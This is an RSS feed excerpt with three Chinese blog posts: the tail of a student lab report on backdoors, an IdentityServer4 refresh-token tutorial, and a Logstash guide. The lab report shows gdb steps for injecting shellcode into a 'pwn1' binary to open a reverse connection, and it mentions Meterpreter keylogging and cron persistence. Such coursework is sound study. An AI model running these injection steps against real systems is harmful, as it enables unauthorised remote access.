&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200319000338668-697329929.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;  &lt;span&gt;    在上图1所指的位置，输入&lt;span&gt;disassemble foo&lt;/span&gt;，对&lt;span&gt;foo&lt;/span&gt;函数进行反汇编，下面是得到的反汇编结果。我们找到其中的返回地址，也就是ret操作的地址，然后在上图&lt;span&gt;2&lt;/span&gt;所指的位置，用&lt;span&gt;break&lt;/span&gt;命令在返回地址处设置断点。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200319000734587-396129111.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在第一个窗口按下回车键，再回到第二个窗口输入&lt;span&gt;c&lt;/span&gt;，运行一下直到断点。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200319000900973-1465818199.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    这时候我们继续在&lt;span&gt;gdb&lt;/span&gt;下输入&lt;span&gt;info r esp&lt;/span&gt;，查询&lt;span&gt;esp&lt;/span&gt;寄存器当前的地址。这个地址加上四，就是我们要注入的地址。对我来说是&lt;span&gt;0xffffd320&lt;/span&gt;。将其填入上面提到的Perl语言中，从前往后四个星号分别填&lt;span&gt;2、0、d&lt;/span&gt;和&lt;span&gt;3&lt;/span&gt;。因为两个十六进制数是一个字节，并且又是小端优先的输入规则，所以是这样一个输入顺序。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318234303545-1300622972.png&quot; alt=&quot;&quot; width=&quot;980&quot; height=&quot;435&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    上图是反弹连接建立成功的结果截图。如上图左端所示，下面第一个蓝色星号表示开始建立反弹连接，当右边界面的命令行执行过&lt;span&gt;(cat input13;cat) | ./pwn1（&lt;span&gt;&lt;span&gt;input13&lt;/span&gt;是&lt;span&gt;perl&lt;/span&gt;语言执行过后生成的文件，我们要把它注入到&lt;span&gt;pwn1&lt;/span&gt;文件中去&lt;/span&gt;）&lt;/span&gt;后，并且回车了以后(得&lt;span&gt;2&lt;/span&gt;次回车，不要因为1次回车没有效果就推倒重来)，上图左端才会出现第二个蓝色星号部分，表示连接会话&lt;span&gt;session 1&lt;/span&gt;已经打开，后面附上了通信双方的IP+端口号以及连接建立的时间。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200319001548683-40583001.png&quot; alt=&quot;&quot; width=&quot;942&quot; height=&quot;176&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图是我在连接成功后做的测试，测试端在左边的命令行中，我先后输入了两条指令，都得到了符合预期的结果。我开启了两个命令行窗口，这种反弹连接的效果，相当于是左边的命令行调用了右边的命令行，能够获悉右边用户的状态、信息。 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 五、实验感想和思考&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;(&lt;span class=&quot;s1&quot;&gt;1)例举你能想到的一个后门进入到你系统中的可能方式？&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;&lt;span class=&quot;s1&quot;&gt;    访问的网页遭受了攻击，该网页被修改成可用自动触发一个新的标签页，这个页面的尺寸是&lt;span&gt;0&lt;/span&gt;，相当于是已经打开了但是自己不知道，这个新页面可以利用浏览器漏洞不经用户同意就下载东西，比如后门。这样，一个后门程序就神不知鬼不觉地进了自己的电脑中，而在这个过程中自己完全不知情。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;(2)例举你知道的后门如何启动起来(&lt;span class=&quot;s1&quot;&gt;win及&lt;span class=&quot;s1&quot;&gt;linux)的方式？&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;&lt;span class=&quot;s1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;    定时任务启动，这也正是本实验做过的内容，Windows里有任务计划程序库可以添加新的定时任务，在kali中可用通过crontab编辑添加新的定时任务。这样的话，后门就可用到时自动启动。其他方式还有开机自启动，绑定到正常程序中随正常程序的启动而启动，或者干脆伪装成一个常用的程序，用户会不小心点到它。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;(3)Meterpreter有哪些给你映像深刻的功能？&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span class=&quot;s1&quot;&gt;    截取音频、屏幕截图、拍照和击键记录，这些都是实验做过的东西，自然印象深刻，至于提权的话，由于只是简单提了一下而没有做更多的探索，所以没有太深的感触，但有一点毫无疑问，即权限被提高到了最高的话，那就可以在系统里面为所欲为了。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;(4)如何发现自己有系统有没有被安装后门？&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;    使用新款的流行杀毒软件监控自己的系统，被它监控不怕，因为它是好的、正规的软件。一旦有后门试图入侵本机，就会被杀软拦截查杀。比如本实验用的后门程序，全世界都知道那是个后门，所以我一启动，联想电脑管家就给我提示了。有些情况下杀软再高明也看不出来那是个后门，如果感觉自己有被监控的迹象，可以看一看任务管理器，都有哪些进程再运行，看看有没有陌生的进程，眼睛需要细到玩文字游戏的地步，比如Windows和Windwos，后门可能会这样伪装来逃避检测。还可以结合端口号进行查看，哪些端口号是自己感觉很陌生的，就有必要重点关注。无论如何，只要发现了后门，就有应对措施和解决办法，首先肯定是尽最大努力保护个人隐私，亡羊补牢为时不晚。然后想方设法根除掉后门，自己不行的话就找电脑技术更高明的人帮忙。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;p1&quot;&gt;&lt;span&gt;    本实验整体做下来，感觉在难度上比实验一简单些，只是执行一些连接指令，有参考的话还是能够很轻易做下来的。我们只是简单接触到了后门这个东西，没有学习如何开发后门，也没有掌握如何防御后门，仅仅是通过几个非常简单的后门工具做了一些基本操作，实验最大的收获还是在信息安全警惕意识方面，它让我对信息安全隐患又有了新的、更深层次的认识，脑海中知道的跟把知道的亲手做一遍是完全不同的两种操作。我对信息安全技术的敬畏之心因此而有了深化，同时我对信息安全技术的兴趣也更加浓厚了，期待以后能探索更多类似的知识！&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 19 Mar 2020 00:23:00 +0000</pubDate>
<dc:creator>20174313张博</dc:creator>
<og:description>一、实验名称 后门原理与实践。 二、实验目的与要求 &amp;#183;掌握后门的概念，知道常见的后门种类，深入理解后门的运作原理。 &amp;#183;掌握几种常见的后门工具，学会利用后门工具进行一些简单操作。 &amp;</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zb20174313/p/12506765.html</dc:identifier>
</item>
<item>
<title>Asp.Net Core 中IdentityServer4 授权原理及刷新Token的应用 - Jlion</title>
<link>http://www.cnblogs.com/jlion/p/12501195.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jlion/p/12501195.html</guid>
<description>&lt;p&gt;客户端请求Api资源网关（受保护的资源）时，第一次收到请求会到授权中心（ids4服务网关）获取验证公钥，并保持到内存中，后面的请求不会再到授权中心去获得验证公钥，而是Api资源网关（受保护的资源）中直接通过保存下来的验证公钥进行验证，从而通过授权&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;170.0578125&quot;&gt;
&lt;h2 id=&quot;一前言&quot;&gt;一、前言&lt;/h2&gt;
&lt;p&gt;上面分享了&lt;code&gt;IdentityServer4&lt;/code&gt; 两篇系列文章，核心主题主要是&lt;code&gt;密码授权模式&lt;/code&gt;及&lt;code&gt;自定义授权模式&lt;/code&gt;，但是仅仅是分享了这两种模式的使用，这篇文章进一步来分享&lt;code&gt;IdentityServer4&lt;/code&gt;的授权流程及&lt;code&gt;refreshtoken&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;系列文章目录(&lt;strong&gt;没看过的先看这几篇文章再来阅读本文章&lt;/strong&gt;)：&lt;/p&gt;
&lt;p&gt;为了继续保持&lt;code&gt;IdentityServer4&lt;/code&gt; 系列博客分享上下文一致，我这里再把上回&lt;code&gt;授权中心&lt;/code&gt;拆分后的图贴出来，如图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200315225158795-1178949567.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图中的&lt;code&gt;授权中心&lt;/code&gt;就是通过&lt;code&gt;IdentityServer4&lt;/code&gt;实现的授权服务中心，我下面就直接用&lt;code&gt;授权中心&lt;/code&gt;代替&lt;code&gt;IdentityServer4&lt;/code&gt;的授权服务来继续述说，也感谢大家对我的支持，一直阅读我的文章。&lt;/p&gt;
&lt;h2 id=&quot;二授权流程&quot;&gt;二、授权流程&lt;/h2&gt;
&lt;h3 id=&quot;客户端验证流程图&quot;&gt;2.1 客户端验证流程图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200315224551855-1158236720.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;流程图中，客户端仅仅会到&lt;code&gt;授权中心&lt;/code&gt; 请求一次，并拿到验证公钥返回给&lt;code&gt;Api资源&lt;/code&gt;拥有端，后面客户端再次尝试请求&lt;code&gt;Api资源&lt;/code&gt;时候就不会再到&lt;code&gt;授权中心&lt;/code&gt;去获取验证公钥，会直接用之前获取到的&lt;code&gt;公钥&lt;/code&gt;进行验证，验证通过则授权通过。&lt;/p&gt;
&lt;h3 id=&quot;授权及刷新refresh_token-流程图&quot;&gt;2.2 授权及刷新refresh_token 流程图&lt;/h3&gt;
&lt;p&gt;然而通过&lt;code&gt;授权中心&lt;/code&gt; 获取到的&lt;code&gt;access_token&lt;/code&gt; 是有有效时间的，如果失效则需要通过&lt;code&gt;refresh_token&lt;/code&gt; 重新到&lt;code&gt;授权中心&lt;/code&gt;去刷新获取最新的&lt;code&gt;access_token&lt;/code&gt;，整体的流程图如下：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200316214849214-1093908921.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;客户端携带上一次获取到的&lt;code&gt;access_token&lt;/code&gt; 请求受保护的&lt;code&gt;Api资源&lt;/code&gt;时，通过&lt;code&gt;公钥&lt;/code&gt;进行验证时发现&lt;code&gt;access_token&lt;/code&gt;已经过期，则客户端再携带&lt;code&gt;refresh_token&lt;/code&gt; 向&lt;code&gt;授权中心&lt;/code&gt;再次发起请求，刷新&lt;code&gt;access_token&lt;/code&gt;以获得最新的&lt;code&gt;access_token&lt;/code&gt;和&lt;code&gt;refresh_token&lt;/code&gt;，用最新的&lt;code&gt;access_token&lt;/code&gt; 去获取受保护的&lt;code&gt;Api资源&lt;/code&gt;，这样可以减少客户端多次跳转登录授权页面，提高用户体验。&lt;/p&gt;
&lt;h2 id=&quot;三应用实战&quot;&gt;三、应用实战&lt;/h2&gt;
&lt;p&gt;说到例子，我这里不从零开始撸代码， 还是在之前的代码基础上继续改造代码，在原有的定义客户端的代码中新增刷新&lt;code&gt;access_token&lt;/code&gt;的相关配置，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public static IEnumerable&amp;lt;Client&amp;gt; GetClients()
{
     return new List&amp;lt;Client&amp;gt;
     {
         new Client()
         {
             ClientId =OAuthConfig.UserApi.ClientId,
             AllowedGrantTypes = new List&amp;lt;string&amp;gt;()
             {
                 GrantTypes.ResourceOwnerPassword.FirstOrDefault(),//Resource Owner Password模式
                 GrantTypeConstants.ResourceWeixinOpen,
             },
             ClientSecrets = {new Secret(OAuthConfig.UserApi.Secret.Sha256()) },
             AllowOfflineAccess = true,//如果要获取refresh_tokens ,必须把AllowOfflineAccess设置为true
             AllowedScopes= {
                 OAuthConfig.UserApi.ApiName,
                 StandardScopes.OfflineAccess,
             },
             AccessTokenLifetime = OAuthConfig.ExpireIn,
         },

      };
 }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果你需要刷新&lt;code&gt;access_token&lt;/code&gt;，则需要把&lt;code&gt;AllowOfflineAccess&lt;/code&gt;设置&lt;code&gt;true&lt;/code&gt;，同时添加&lt;code&gt;StandardScopes.OfflineAccess&lt;/code&gt; 这个&lt;code&gt;Scopes&lt;/code&gt;，主要代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;AllowOfflineAccess = true,//如果要获取refresh_tokens ,必须把AllowOfflineAccess设置为true
AllowedScopes= {
     OAuthConfig.UserApi.ApiName,
     StandardScopes.OfflineAccess,//如果要获取refresh_tokens ,必须在scopes中加上OfflineAccess
},&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;授权中心&lt;/code&gt;，完整代码如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;OAuthMemoryData&lt;/code&gt; 代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/// &amp;lt;summary&amp;gt;
/// 
/// &amp;lt;/summary&amp;gt;
public class OAuthMemoryData
{
        /// &amp;lt;summary&amp;gt;
        /// 资源
        /// &amp;lt;/summary&amp;gt;
        /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
        public static IEnumerable&amp;lt;ApiResource&amp;gt; GetApiResources()
        {
            return new List&amp;lt;ApiResource&amp;gt;
            {
                new ApiResource(OAuthConfig.UserApi.ApiName,OAuthConfig.UserApi.ApiName),
            };
        }

        public static IEnumerable&amp;lt;Client&amp;gt; GetClients()
        {
            return new List&amp;lt;Client&amp;gt;
            {
                new Client()
                {
                    ClientId =OAuthConfig.UserApi.ClientId,
                    AllowedGrantTypes = new List&amp;lt;string&amp;gt;()
                    {
                        GrantTypes.ResourceOwnerPassword.FirstOrDefault(),//Resource Owner Password模式
                        GrantTypeConstants.ResourceWeixinOpen,
                    },
                    ClientSecrets = {new Secret(OAuthConfig.UserApi.Secret.Sha256()) },
                    AllowOfflineAccess = true,//如果要获取refresh_tokens ,必须把AllowOfflineAccess设置为true
                    AllowedScopes= {
                        OAuthConfig.UserApi.ApiName,
                        StandardScopes.OfflineAccess,
                    },
                    AccessTokenLifetime = OAuthConfig.ExpireIn,
                },

            };
        }

        /// &amp;lt;summary&amp;gt;
        /// 测试的账号和密码
        /// &amp;lt;/summary&amp;gt;
        /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
        public static List&amp;lt;TestUser&amp;gt; GetTestUsers()
        {
            return new List&amp;lt;TestUser&amp;gt;
            {
                new TestUser()
                {
                     SubjectId = &quot;1&quot;,
                     Username = &quot;test&quot;,
                     Password = &quot;123456&quot;
                },
            };
        }

        /// &amp;lt;summary&amp;gt;
        /// 微信openId 的测试用户
        /// &amp;lt;/summary&amp;gt;
        /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
        public static List&amp;lt;TestUser&amp;gt; GetWeiXinOpenIdTestUsers()
        {
            return new List&amp;lt;TestUser&amp;gt;
            {
                new TestUser(){
                  SubjectId=&quot;owerhwroogs3902openId&quot;,
                }
            };
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Startup&lt;/code&gt; 完整代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; public class Startup
 {
        public Startup(IConfiguration configuration)
        {
            Configuration = configuration;
        }

        public IConfiguration Configuration { get; }

        // This method gets called by the runtime. Use this method to add services to the container.
        public void ConfigureServices(IServiceCollection services)
        {
            services.AddControllers();

            services.Configure&amp;lt;CookiePolicyOptions&amp;gt;(options =&amp;gt;
            {
                // This lambda determines whether user consent for non-essential cookies is needed for a given request.
                options.CheckConsentNeeded = context =&amp;gt; true;
                options.MinimumSameSitePolicy = SameSiteMode.None;
            });


            #region 内存方式
            //services.AddIdentityServer()
            //    .AddDeveloperSigningCredential()
            //    .AddInMemoryApiResources(OAuthMemoryData.GetApiResources())
            //    .AddInMemoryClients(OAuthMemoryData.GetClients())
            //    .AddTestUsers(OAuthMemoryData.GetTestUsers());
            #endregion

            #region 数据库存储方式
            services.AddIdentityServer()
                .AddDeveloperSigningCredential()
                .AddInMemoryApiResources(OAuthMemoryData.GetApiResources())
                //.AddInMemoryClients(OAuthMemoryData.GetClients())
                .AddClientStore&amp;lt;ClientStore&amp;gt;()
                .AddResourceOwnerValidator&amp;lt;ResourceOwnerPasswordValidator&amp;gt;()
                .AddExtensionGrantValidator&amp;lt;WeiXinOpenGrantValidator&amp;gt;();//添加微信端自定义方式的验证
            #endregion
        }

        // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.
        public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
        {
            if (env.IsDevelopment())
            {
                app.UseDeveloperExceptionPage();
            }

            app.UseIdentityServer();

            app.UseRouting();
            app.UseAuthorization();
            app.UseEndpoints(endpoints =&amp;gt;
            {
                endpoints.MapControllers();
            });
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;授权中心&lt;/code&gt;代码基本上已经改造完成，我们用postman 访问&lt;code&gt;授权中心&lt;/code&gt; 试一试，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200316224158908-1620586984.png&quot;/&gt;&lt;br/&gt;访问结果中已经包含了&lt;code&gt;refresh_token&lt;/code&gt;和&lt;code&gt;access_token&lt;/code&gt;等相关信息。&lt;/p&gt;
&lt;p&gt;我们再来通过&lt;code&gt;access_token&lt;/code&gt; 访问&lt;code&gt;Api资源&lt;/code&gt;（上两篇有相关代码,未阅读上两篇先去查阅）这里我就直接携带&lt;code&gt;access_token&lt;/code&gt;去访问，如图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200316225217253-1556797160.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问成功！！&lt;/p&gt;
&lt;p&gt;我们再来刷新下&lt;code&gt;refresh_token&lt;/code&gt; ，访问如图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200316225352851-1579605608.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;刷新&lt;code&gt;refresh_token&lt;/code&gt;成功。&lt;br/&gt;&lt;strong&gt;我们到这里再来做一个小小的测试，测试上面的授权流程中的，第4，5 步，上面说到第4步主要是客户端第一次请求&lt;code&gt;Api资源&lt;/code&gt;时会向&lt;code&gt;ids4&lt;/code&gt;服务网关去请求获取验证公钥，&lt;br/&gt;获取成功返回给&lt;code&gt;Api资源&lt;/code&gt;并存储在内存中，后续不再会到&lt;code&gt;ids4&lt;/code&gt;服务去获取验证公钥&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们把上面的&lt;code&gt;授权中心&lt;/code&gt; (ids4服务网关)停止运行，再来用之前的&lt;code&gt;access_token&lt;/code&gt;请求&lt;code&gt;Api资源&lt;/code&gt;，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200316230013192-14329478.png&quot;/&gt;&lt;br/&gt;现在已经确定&lt;code&gt;授权中心&lt;/code&gt;(ids4服务网关)确实停止了，不能访问了，那我们再来通过之前未过期的&lt;code&gt;access_token&lt;/code&gt;来请求&lt;code&gt;Api资源&lt;/code&gt;网关，结果如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200316230121991-1846428283.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;完美，请求还是成功，这完全证明：&lt;strong&gt;客户端请求Api资源网关（受保护的资源）时，第一次收到请求会到授权中心（ids4服务网关）获取验证公钥，并保持到内存中，后面的请求不会再到授权中心去获得验证公钥，而是Api资源网关（受保护的资源）中直接通过保存下来的验证公钥进行验证，从而通过授权&lt;/strong&gt;。&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 18 Mar 2020 23:54:00 +0000</pubDate>
<dc:creator>Jlion</dc:creator>
<og:description>客户端请求Api资源网关（受保护的资源）时，第一次收到请求会到授权中心（ids4服务网关）获取验证公钥，并保持到内存中，后面的请求不会再到授权中心去获得验证公钥，而是Api资源网关（受保护的资源）中直</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jlion/p/12501195.html</dc:identifier>
</item>
<item>
<title>如何使用Logstash - 雪山飞猪</title>
<link>http://www.cnblogs.com/chenqionghe/p/12521113.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenqionghe/p/12521113.html</guid>
<description>&lt;p&gt;Logstash是一个日志收集器，可以理解为一个管道，或者中间件。&lt;br/&gt;功能是从定义的输入源inputs读取信息，经过filters过滤器处理，输入到定义好的outputs输出源。&lt;br/&gt;输入源可以是stdin、日志文件、数据库等，输出源可以是stdout、elesticsearch、HDFS等。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225735684-152581427.png&quot;/&gt;&lt;br/&gt;另外，Logstash不只是一个input | filter | output 的数据流，而是一个 input | decode | filter | encode | output 的数据流！有一个codec插件就是用来 decode、encode 事件的，可以解析我们经常用的json格式，非常的强大，接下来给大家演示一下Logstash的使用，一学就会。&lt;/p&gt;

&lt;p&gt;最简单方式是直接&lt;a href=&quot;https://www.elastic.co/cn/downloads/logstash&quot;&gt;下载&lt;/a&gt;安装，另外也可以通过&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/docker.html&quot;&gt;docker安装&lt;/a&gt;，&lt;br/&gt;我是直接下载的zip包，解压后如下&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225740925-1116536827.png&quot;/&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;直接启动&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;./bin/logstash -e 'input { stdin { } } output { stdout {} }'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225748989-2019347732.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;-e 代表可以从命令行读取配置，&lt;code&gt;input { stdin { } } output { stdout {} }'&lt;/code&gt;代表从标准stdin读取，从stdout输出，我们输入&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;chenqionghe
no pain, no gain.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;显示如下，logstash把时间等一些信息打印出来了&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225826906-986983807.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;logstash会给事件添加一些额外的信息，最重要的就是 &lt;code&gt;@timestamp&lt;/code&gt;，用来标记事件的发生时间。此外，大多数时候还可以见到host、type、tags 等属性&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;使用配置启动&lt;br/&gt;例如我们可以将上面的-e定义成一个&lt;code&gt;chenqionghe.yml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;yaml&quot;&gt;
&lt;code&gt;input {
    stdin { }
}
output {
    stdout { }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;./bin/logstash -f chenqionghe.yml&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;更多配置查看 ：&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/configuration.html&quot;&gt;configuration&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;用来指定数据来源，可以是标准输入、文件、TCP数据、Syslog、Redis等&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;读取文件&lt;br/&gt;例如，我要收集nginx的访问文件和错误文件，可以这样写&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {
    file {
        path =&amp;gt; [&quot;/Users/chenqionghe/web/log/nginx-access.log&quot;,&quot;/Users/chenqionghe/web/log/nginx-error.log&quot;]
        type =&amp;gt; &quot;nginx&quot;
    }
}
output {
  stdout { codec =&amp;gt; rubydebug }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;output指定了一个rubydebug，简单的理解就是一个调试输出的插件，后面会对output进行说明&lt;br/&gt;结果运行，可以看到收集到了nignx日志&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225912684-1618147731.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;常用配置项&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;* discover_interval
logstash 每隔多久去检查一次被监听的 path 下是否有新文件。默认值是 15 秒。

* exclude
不想被监听的文件可以排除出去，这里跟 path 一样支持 glob 展开。

* sincedb_path
如果你不想用默认的 $HOME/.sincedb(Windows 平台上在 C:\Windows\System32\config\systemprofile\.sincedb)，可以通过这个配置定义 sincedb 文件到其他位置。

* sincedb_write_interval
logstash 每隔多久写一次 sincedb 文件，默认是 15 秒。

* stat_interval
logstash 每隔多久检查一次被监听文件状态（是否有更新），默认是 1 秒。

* start_position
logstash 从什么位置开始读取文件数据，默认是结束位置，也就是说 logstash 进程会以类似 tail -F 的形式运行。如果你是要导入原有数据，把这个设定改成 &quot;beginning&quot;，logstash 进程就从头开始读取，有点类似 cat，但是读到最后一行不会终止，而是继续变成 tail -F。&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;生成测试数据&lt;br/&gt;例如可以使用generator来生成测试输入数据，下面的例子相当于循环了100次&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {
    generator {
        count =&amp;gt; 100
        message =&amp;gt; '{&quot;name&quot;:&quot;chenqionghe&quot;,&quot;hello&quot;:[&quot;light&quot;,&quot;weight&quot;,&quot;baby&quot;]}'
        codec =&amp;gt; json
    }
}
output {
  stdout {}
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行如下&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225918321-1953460792.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;更多input查看：&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/input-plugins.html&quot;&gt;input-plugins&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;事实上，我们在上面已经用过 codec 了 ，rubydebug 就是一种 codec，虽然它一般只会用在 stdout 插件中，作为配置测试或者调试的工具。&lt;br/&gt;codec 使得 logstash 可以更好更方便的与其他有自定义数据格式的运维产品共存，比如 graphite、fluent、netflow、collectd，以及使用 msgpack、json、edn 等通用数据格式的其他产品等。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;JSON编码&lt;br/&gt;直接输入预定义好的 JSON 数据，以nginx的配置为例，添加如下配置，让nginx输出json&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;log_format json '{&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,'
               '&quot;@version&quot;:&quot;1&quot;,'
               '&quot;host&quot;:&quot;$server_addr&quot;,'
               '&quot;client&quot;:&quot;$remote_addr&quot;,'
               '&quot;size&quot;:$body_bytes_sent,'
               '&quot;responsetime&quot;:$request_time,'
               '&quot;domain&quot;:&quot;$host&quot;,'
               '&quot;url&quot;:&quot;$uri&quot;,'
               '&quot;status&quot;:&quot;$status&quot;}';
access_log /Users/chenqionghe/web/log/nginx-access.log json;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在logstash中配置&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;input {
    file {
        path =&amp;gt; &quot;/Users/chenqionghe/web/log/nginx-access.log&quot;
        codec =&amp;gt; &quot;json&quot;
    }
}
output {
  stdout { codec =&amp;gt; rubydebug }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动请求如下&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318225958399-473433344.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;合并多行数据&lt;br/&gt;multiline 插件可以收集多行数据，用于用于其他类似的堆栈式信息&lt;br/&gt;示例如下&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {
    stdin {
        codec =&amp;gt; multiline {
            pattern =&amp;gt; &quot;^\[&quot;
            negate =&amp;gt; true
            what =&amp;gt; &quot;previous&quot;
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输入&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[2020-03-18 14:54:03] hello chenqionghe
[2020-03-18 14:54:03]hello gym
    light weight baby
    let's do it !
[2020-03-18 14:54:03] finished&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;效果如下&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230003650-1490515023.png&quot;/&gt;&lt;/p&gt;
